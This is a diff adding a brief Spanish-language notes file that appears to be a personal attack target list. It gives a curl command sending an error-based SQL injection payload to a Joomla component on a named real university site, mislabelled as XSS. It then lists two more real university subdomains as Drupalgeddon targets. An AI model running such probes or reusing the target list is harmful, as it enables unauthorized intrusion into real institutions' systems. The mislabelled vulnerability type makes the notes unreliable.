@@ -1,0 +1,7 @@
+Posible XSS:
+curl -g "http://cuved.unam.mx/cuved/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,truerandomtruerandom),1)" -s | grep truerandom --color
+
+Drupalgeddon
+http://mediacampus.cuaed.unam.mx/
+http://redensayo.cialc.unam.mx/
+
